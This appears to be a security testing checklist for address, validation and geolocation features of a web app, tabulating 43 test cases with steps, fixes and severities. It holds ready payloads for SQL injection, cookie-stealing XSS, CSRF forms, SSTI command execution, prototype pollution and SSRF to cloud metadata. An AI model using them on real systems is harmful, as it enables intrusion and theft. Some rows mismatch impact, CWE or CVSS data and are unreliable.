# 7. Address & Location — Checklist

Feature-area security **test cases** for “7. Address & Location” — functionality-driven, impact-first with severity + CVSS.

*138 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| ADDR-001 | IDOR on Adding Address to Another User Account | Broken Access Control (WSTG-AUTHZ-04) | Add / Edit / Delete Address | 1. Login as User A and add a new address.<br>2. Intercept the request and change user_id to User B.<br>3. Submit the request.<br>4. Login as User B and check if the address was added to their account. | Application must validate that the authenticated user can only add addresses to their own account and reject cross-user modifications. | <code>Change user_id=1001 to user_id=1002 in POST /api/addresses body</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-002 | IDOR on Editing Another User Address | Broken Access Control (WSTG-AUTHZ-04) | Add / Edit / Delete Address | 1. Login as User A and edit own address.<br>2. Intercept the PUT/PATCH request and change address_id to an address belonging to User B.<br>3. Submit and verify if User B's address is modified. | Application must verify ownership of the address before allowing any edit operation. | <code>Change PUT /api/addresses/ADDR-1001 to PUT /api/addresses/ADDR-1002 with User A token</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-003 | IDOR on Deleting Another User Address | Broken Access Control (WSTG-AUTHZ-04) | Add / Edit / Delete Address | 1. Login as User A and delete own address.<br>2. Intercept the DELETE request and change address_id to User B's address.<br>3. Submit and verify if User B's address is deleted. | Application must verify that the authenticated user owns the address before allowing deletion. | <code>Change DELETE /api/addresses/ADDR-1001 to DELETE /api/addresses/ADDR-1002</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-004 | SQL Injection in Address Fields | Injection (WSTG-INPV-05) | Add / Edit / Delete Address | 1. Add or edit an address.<br>2. Inject SQL payloads in fields like street_address or city or state or zip_code.<br>3. Submit and observe the response for SQL errors or data leakage. | Application must use parameterized queries for all address-related database operations and never concatenate user input into SQL. | <code>street_address=123 Main St' OR 1=1--;city=TestCity' UNION SELECT username;password FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADDR-005 | Stored XSS in Address Fields | Cross-Site Scripting (WSTG-INPV-02) | Add / Edit / Delete Address | 1. Add a new address with XSS payload in street_address or name or city fields.<br>2. Save the address.<br>3. Navigate to address book or checkout page.<br>4. Check if script executes when the address is rendered. | Application must sanitize all address field inputs on storage and encode all outputs when rendering addresses in any context. | <code>street_address=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;name=&lt;img src=x onerror=alert('XSS')&gt;;city=&lt;svg/onload=alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADDR-006 | CSRF on Address Addition | CSRF (WSTG-SESS-05) | Add / Edit / Delete Address | 1. Craft a malicious HTML page that auto-submits an add address request with attacker's address details.<br>2. Lure an authenticated victim to visit the page.<br>3. Check if the attacker's address is added to the victim's account. | Application must implement and validate anti-CSRF tokens on all address management operations. | <code>&lt;form action='https://target.com/api/addresses' method='POST'&gt;&lt;input name='street' value='Attacker Street'&gt;&lt;input name='city' value='Evil City'&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| ADDR-007 | CSRF on Address Deletion | CSRF (WSTG-SESS-05) | Add / Edit / Delete Address | 1. Craft a malicious page that sends a DELETE request for the victim's address.<br>2. Have the victim visit the page while authenticated.<br>3. Check if the address is deleted. | Application must validate CSRF tokens on all destructive operations including address deletion. | <code>&lt;img src='https://target.com/api/addresses/ADDR-1001/delete'&gt; or auto-submit DELETE form</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| ADDR-008 | Mass Assignment on Address Object | Mass Assignment (WSTG-INPV-01) | Add / Edit / Delete Address | 1. Add a new address with normal fields.<br>2. Inject additional parameters like is_verified=true or is_admin_address=true or user_id=9999 in the request body.<br>3. Check if hidden fields are accepted. | Application must whitelist only allowed address fields and ignore any unexpected or unauthorized parameters in the request. | <code>Add is_verified=true&amp;is_primary=true&amp;user_role=admin&amp;account_id=9999 to POST /api/addresses body</code> | Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-915; [IDOR kit](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA |
| ADDR-009 | Address Field Length Overflow | Input Validation (WSTG-INPV-01) | Add / Edit / Delete Address | 1. Add an address with extremely long values in each field.<br>2. Submit street_address with 100000+ characters.<br>3. Observe server behavior for crashes or truncation issues or buffer overflow. | Application must enforce reasonable maximum length limits on all address fields and return appropriate validation errors. | <code>street_address=A&#42;100000;city=B&#42;50000;state=C&#42;50000;zip_code=D&#42;50000</code> | Improper input validation -&gt; downstream injection / logic abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ADDR-010 | HTML Injection in Address Fields | Injection (WSTG-INPV-03) | Add / Edit / Delete Address | 1. Add an address with HTML tags in fields like street_address or name.<br>2. Save and view the address in different contexts like checkout or order confirmation or admin panel.<br>3. Check for content injection. | Application must sanitize HTML tags in address fields and render content as plain text. | <code>street_address=&lt;h1&gt;HACKED&lt;/h1&gt;&lt;a href='https://evil.com'&gt;Click Here&lt;/a&gt;;name=&lt;marquee&gt;Injected&lt;/marquee&gt;</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADDR-011 | NoSQL Injection in Address Fields | Injection (WSTG-INPV-05) | Add / Edit / Delete Address | 1. If backend uses NoSQL database inject NoSQL payloads in address fields.<br>2. Submit and check for authentication bypass or data extraction. | Application must sanitize all inputs against NoSQL injection patterns and use parameterized queries. | <code>{"street_address":{"$gt":""};"city":{"$ne":null};"$where":"sleep(5000)"}</code> | NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;NoSQLMap | CWE-943; [No[SQLi kit](#/checklist/sqli)](#/checklist/nosqli); PortSwigger NoSQL injection |
| ADDR-012 | Unauthenticated Address Management | Authentication (WSTG-ATHN-01) | Add / Edit / Delete Address | 1. Capture an address add/edit/delete request.<br>2. Remove the session cookie or authorization token.<br>3. Replay the request without any authentication.<br>4. Check if the operation succeeds. | Application must require valid authentication for all address management endpoints. | <code>Remove Authorization: Bearer token or Cookie: session=abc from address API requests</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ADDR-013 | Address Enumeration via Sequential IDs | Information Disclosure (WSTG-INFO-04) | Add / Edit / Delete Address | 1. Note the format and pattern of address_id values.<br>2. Enumerate sequential address IDs using Burp Intruder.<br>3. Check if address details for other users are returned. | Application must use non-sequential unpredictable address identifiers and enforce authorization on every access. | <code>Enumerate GET /api/addresses/1 through GET /api/addresses/10000</code> | Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;ffuf | CWE-204; [Account Takeover kit](#/checklist/ato); OWASP WSTG-IDNT-04 |
| ADDR-014 | Unlimited Address Creation for DoS | Business Logic (WSTG-BUSL-05) | Add / Edit / Delete Address | 1. Script automated address creation requests.<br>2. Send thousands of add address requests for a single account.<br>3. Check if rate limiting exists or if storage is exhausted. | Application must implement rate limiting and maximum address count per account to prevent abuse. | <code>Send 10000 POST /api/addresses requests in rapid succession</code> | Denial of service -&gt; availability impact for this feature / the app. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-400; [Race Condition kit](#/checklist/racecondition); OWASP; PortSwigger |
| ADDR-015 | CRLF Injection in Address Fields | Injection (WSTG-INPV-15) | Add / Edit / Delete Address | 1. Add an address with CRLF characters injected in address fields.<br>2. Check if HTTP headers are injected when the address is included in responses or emails. | Application must strip or encode CRLF characters in all address field inputs. | <code>street_address=123 Main St%0d%0aSet-Cookie:session=evil;city=Test%0d%0aX-Injected:true</code> | CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-113; [Host Header kit](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger |
| ADDR-016 | Server-Side Template Injection in Address Fields | Injection (WSTG-INPV-18) | Add / Edit / Delete Address | 1. Add an address with SSTI payloads in fields like name or street_address.<br>2. Trigger any template rendering such as invoice generation or email confirmation.<br>3. Check if the template engine processes the payload. | Application must treat address data as plain text and escape template syntax before rendering. | <code>name={{7&#42;7}};street_address=${7&#42;7};city=&lt;%= system('id') %&gt;;state={{config.items()}}</code> | Server-side template injection -&gt; remote code execution on the app server. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Tplmap | CWE-1336; [SSTI kit](#/checklist/ssti); PortSwigger SSTI (James Kettle) |
| ADDR-017 | Privilege Escalation via Address Admin Endpoint | Broken Access Control (WSTG-AUTHZ-02) | Add / Edit / Delete Address | 1. As a regular user try accessing admin address management endpoints.<br>2. Attempt URLs like /api/admin/addresses or /api/admin/users/addresses.<br>3. Check if access is granted. | Application must enforce role-based access control and deny admin address endpoints to non-admin users. | <code>GET /api/admin/addresses;GET /api/admin/users/1002/addresses;DELETE /api/admin/addresses/ADDR-1001 with regular user token</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;DirBuster | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-018 | HTTP Method Tampering on Address Endpoint | HTTP Methods (WSTG-CONF-06) | Add / Edit / Delete Address | 1. Send address management requests using unexpected HTTP methods like TRACE or OPTIONS or PUT on a POST-only endpoint.<br>2. Check if unintended methods are accepted. | Application must restrict HTTP methods to only those intended for each endpoint and return 405 Method Not Allowed for others. | <code>Send TRACE /api/addresses;PUT /api/addresses when only POST allowed;DELETE /api/addresses without specific ID</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-16; OWASP Security Misconfiguration (A05) |
| ADDR-019 | JSON Injection in Address Payload | Injection (WSTG-INPV-01) | Add / Edit / Delete Address | 1. Add an address and inject malformed JSON or additional JSON keys in the request body.<br>2. Check for parser confusion or unexpected behavior. | Application must strictly validate JSON structure and reject malformed or unexpected JSON payloads. | <code>{"street":"123 Main";"street":"456 Evil St"} or {"street":"test\";\"admin\":true;\""}</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADDR-020 | Prototype Pollution via Address Object | Injection (WSTG-INPV-01) | Add / Edit / Delete Address | 1. If Node.js backend inject prototype pollution payloads in address JSON body.<br>2. Check for unexpected behavior or privilege escalation. | Application must sanitize incoming JSON objects and prevent prototype pollution attacks. | <code>{"__proto__":{"isAdmin":true};"constructor":{"prototype":{"role":"admin"}}}</code> | Prototype pollution -&gt; DOM XSS (client) / RCE (server). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Scripts | CWE-1321; [Prototype Pollution kit](#/checklist/prototype); Olivier Arteau; PortSwigger server-side PP |
| ADDR-021 | IDOR on Setting Default Address for Another User | Broken Access Control (WSTG-AUTHZ-04) | Default Address Selection | 1. Set a default address for own account.<br>2. Intercept the request and change user_id or account_id to another user.<br>3. Check if the default address for another user is changed. | Application must verify that the authenticated user can only modify their own default address setting. | <code>Change PUT /api/addresses/default with user_id=1001 to user_id=1002</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-022 | Setting Non-Owned Address as Default | Broken Access Control (WSTG-AUTHZ-04) | Default Address Selection | 1. Intercept the set default address request.<br>2. Change address_id to an address belonging to another user.<br>3. Submit and check if another user's address is set as your default. | Application must verify that the address being set as default belongs to the authenticated user. | <code>PUT /api/addresses/set-default with address_id=ADDR-2001 (belonging to User B) using User A token</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ADDR-023 | CSRF on Default Address Change | CSRF (WSTG-SESS-05) | Default Address Selection | 1. Craft a malicious page that changes the victim's default address to a previously added attacker-controlled address.<br>2. Lure victim to visit the page.<br>3. Check if default address changes. | Application must validate CSRF tokens on default address change requests. | <code>&lt;form action='https://target.com/api/addresses/set-default' method='POST'&gt;&lt;input name='address_id' value='ADDR-ATTACKER'&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| ADDR-024 | Race Condition on Default Address Setting | Business Logic (WSTG-BUSL-08) | Default Address Selection | 1. Send multiple simultaneous requests to set different addresses as default.<br>2. Check for inconsistent state where multiple addresses are marked as default.<br>3. Verify data integrity. | Application must implement proper locking to ensure only one address is default at any time. | <code>Send 10 concurrent PUT /api/addresses/set-default with different address_ids</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Turbo Intruder;Burp Suite | CWE-362; [Race Condition kit](#/checklist/racecondition); James Kettle Smashing the State Machine |
| ADDR-025 | Bypassing Default Address Requirement | Business Logic (WSTG-BUSL-02) | Default Address Selection | 1. Delete all addresses including the default one.<br>2. Attempt to place an order without any default address.<br>3. Check if the application handles the missing default address gracefully. | Application must require a valid default address before allowing order placement and handle missing address scenarios with clear user prompts. | <code>DELETE all addresses then POST /api/orders without any address set</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-026 | Default Address Override During Checkout | Business Logic (WSTG-BUSL-01) | Default Address Selection | 1. Set a default address.<br>2. During checkout intercept the request and change the shipping_address_id to a different address or inject a new address.<br>3. Check if override is validated. | Application must validate that the shipping address used during checkout belongs to the authenticated user. | <code>Change shipping_address_id in checkout request to non-owned address_id or inject inline address bypassing stored addresses</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-027 | Bypassing Server-Side Address Validation | Input Validation (WSTG-INPV-01) | Address Validation | 1. Enter an obviously invalid address like random characters or fictional location.<br>2. Bypass frontend validation by submitting directly via API.<br>3. Check if invalid address is accepted. | Application must perform server-side address validation independent of frontend checks and reject clearly invalid addresses. | <code>POST /api/addresses with street=aaaaaaa;city=xxxxx;state=zzz;zip=00000 directly via API bypassing UI</code> | Improper input validation -&gt; downstream injection / logic abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ADDR-028 | Address Validation Bypass via Encoding | Input Validation (WSTG-INPV-01) | Address Validation | 1. Enter a valid-looking address but use URL encoding or Unicode characters to bypass validation patterns.<br>2. Submit and check if the address passes validation despite being invalid. | Application must normalize and decode all address inputs before validation to prevent encoding-based bypasses. | <code>street=%31%32%33%20%4D%61%69%6E;city=Test%00City;state=C%41 or use Unicode homoglyphs</code> | Improper input validation -&gt; downstream injection / logic abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ADDR-029 | SQL Injection via Address Validation Endpoint | Injection (WSTG-INPV-05) | Address Validation | 1. Use the address validation endpoint to validate a new address.<br>2. Inject SQL payloads in the validation parameters.<br>3. Observe the response for SQL errors or data extraction. | Application must use parameterized queries for all address validation database lookups. | <code>POST /api/addresses/validate with city=' OR 1=1--;zip_code=12345' UNION SELECT &#42; FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ADDR-030 | Validation Service SSRF | SSRF (WSTG-INPV-19) | Address Validation | 1. If address validation calls an external service intercept the request.<br>2. Modify the validation endpoint URL to an internal address.<br>3. Check if SSRF is possible. | Application must hardcode validation service URLs server-side and not accept client-provided validation endpoints. | <code>Change validation_url=https://api.validation.com to validation_url=http://169.254.169.254/latest/meta-data/</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| ADDR-031 | Address Validation Timing Attack | Information Disclosure (WSTG-INFO-01) | Address Validation | 1. Submit valid and invalid addresses to the validation endpoint.<br>2. Measure response times.<br>3. Check if timing differences can be used to enumerate valid addresses or zip codes. | Application must ensure consistent response times for both valid and invalid address submissions to prevent timing-based enumeration. | <code>Compare response times for valid zip=10001 vs invalid zip=99999 across multiple requests</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADDR-032 | Denial of Service via Repeated Validation Requests | Business Logic (WSTG-BUSL-05) | Address Validation | 1. Send a large number of address validation requests in rapid succession.<br>2. Check if rate limiting is enforced.<br>3. Monitor for service degradation or third-party API abuse. | Application must implement rate limiting on validation endpoints to prevent abuse and excessive third-party API calls. | <code>Send 1000+ POST /api/addresses/validate requests per minute</code> | Denial of service -&gt; availability impact for this feature / the app. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;JMeter | CWE-400; [Race Condition kit](#/checklist/racecondition); OWASP; PortSwigger |
| ADDR-033 | Validation Response Manipulation | Business Logic (WSTG-BUSL-01) | Address Validation | 1. Submit an invalid address for validation.<br>2. Intercept the validation response.<br>3. Change is_valid=false to is_valid=true.<br>4. Forward the response and check if the application proceeds with the invalid address. | Application must re-validate addresses server-side before processing and not rely solely on client-received validation results. | <code>Intercept validation response and change {"is_valid":false} to {"is_valid":true;"confidence":"high"}</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ADDR-034 | Special Characters in Validation Fields | Input Validation (WSTG-INPV-01) | Address Validation | 1. Enter special characters in address validation fields including null bytes and control characters.<br>2. Check for unexpected behavior or error disclosure. | Application must handle special characters gracefully and not expose internal errors or crash. | <code>street=123\x00Main\x01St;city=Test\x0aCity;zip=123\r\n45</code> | Improper input validation -&gt; downstream injection / logic abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ADDR-035 | Geolocation Spoofing for Unauthorized Access | Business Logic (WSTG-BUSL-01) | Geolocation / Auto-detect | 1. Use browser developer tools or proxy to spoof geolocation coordinates.<br>2. Set location to a region with different pricing or restricted products.<br>3. Check if spoofed location is trusted. | Application must not solely rely on client-side geolocation for security-critical decisions like pricing or product availability. | <code>Spoof navigator.geolocation to lat=0.0;lng=0.0 or coordinates of a different pricing region</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Browser DevTools;Burp Suite | CWE-840; PortSwigger Business logic |
| ADDR-036 | Geolocation API Data Exposure | Information Disclosure (WSTG-INFO-05) | Geolocation / Auto-detect | 1. Trigger geolocation auto-detect.<br>2. Intercept the request to the backend.<br>3. Check if exact GPS coordinates are transmitted and stored.<br>4. Verify what precision of location data is sent. | Application must only collect and store the minimum necessary location precision and inform users about data collection. | <code>Check if exact lat=40.7128000;lng=-74.0060000 (high precision) is sent vs city-level approximation</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADDR-037 | Geolocation Injection for Price Manipulation | Business Logic (WSTG-BUSL-01) | Geolocation / Auto-detect | 1. Intercept the geolocation data sent to the server.<br>2. Modify coordinates to a location with lower delivery fees or different tax rates.<br>3. Check if pricing changes based on spoofed location. | Application must validate location data against the confirmed delivery address and not use raw client geolocation for pricing. | <code>Change lat=40.7128&amp;lng=-74.0060 to coordinates of a tax-free zone or free-delivery area</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-038 | Geolocation Permission Bypass | Client-Side (WSTG-CLNT-01) | Geolocation / Auto-detect | 1. Deny geolocation permission in browser.<br>2. Check if the application has fallback mechanisms that leak location via IP geolocation or other means.<br>3. Verify privacy is respected. | Application must gracefully handle denied geolocation permissions without using alternative tracking methods and allow manual address entry. | <code>Deny browser geolocation prompt and monitor for IP-based geolocation API calls or hidden location tracking</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Browser DevTools;Burp Suite | CWE-840; PortSwigger Business logic |
| ADDR-039 | SSRF via Geolocation Reverse Geocoding | SSRF (WSTG-INPV-19) | Geolocation / Auto-detect | 1. If application performs reverse geocoding by sending coordinates to an API intercept the request.<br>2. Check if the geocoding service URL is client-controllable.<br>3. Test for SSRF. | Application must hardcode geocoding service URLs and not accept client-provided reverse geocoding endpoints. | <code>Change geocoding_url to http://127.0.0.1:8080 or http://169.254.169.254/latest/meta-data/</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| ADDR-040 | Geolocation Data Stored Without Consent | Privacy (WSTG-INFO-05) | Geolocation / Auto-detect | 1. Trigger auto-detect location.<br>2. Check backend storage and database for persisted location data.<br>3. Verify if user consent was obtained and if data retention policies are followed. | Application must obtain explicit user consent before storing geolocation data and adhere to data retention and privacy policies. | <code>Review database for stored coordinates; check for consent mechanism before geolocation API call</code> | Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Manual Database Review | CWE-359; [IDOR kit](#/checklist/idor); OWASP Privacy Risks; GDPR |
| ADDR-041 | XSS via Geolocation Response Display | Cross-Site Scripting (WSTG-INPV-02) | Geolocation / Auto-detect | 1. If the application displays the auto-detected location name to the user intercept the geolocation API response.<br>2. Inject XSS payload in the location name.<br>3. Check if it renders. | Application must encode all location data before displaying it to users regardless of the data source. | <code>Intercept reverse geocoding response and change location_name to &lt;script&gt;alert(1)&lt;/script&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;MitM Proxy | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| ADDR-042 | Replay Attack with Old Geolocation Data | Session Management (WSTG-SESS-03) | Geolocation / Auto-detect | 1. Capture a geolocation submission request with valid coordinates.<br>2. Replay the same request later from a different actual location.<br>3. Check if old location data is accepted without re-verification. | Application must timestamp geolocation data and require periodic refresh rather than accepting stale location information. | <code>Replay captured POST /api/location/detect with old coordinates after physically moving to different location</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ADDR-043 | Google Maps API Key Exposure | Information Disclosure (WSTG-INFO-05) | Google Maps Integration | 1. Inspect page source and JavaScript files for Google Maps API keys.<br>2. Check if the key is exposed in client-side code.<br>3. Test if the key has proper restrictions. | Google Maps API keys must be restricted to specific referrers and APIs and not be exposed without proper access controls. | <code>Search page source for AIzaSy or maps.googleapis.com?key= in JS files and HTML</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Browser DevTools;GitLeaks;TruffleHog | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
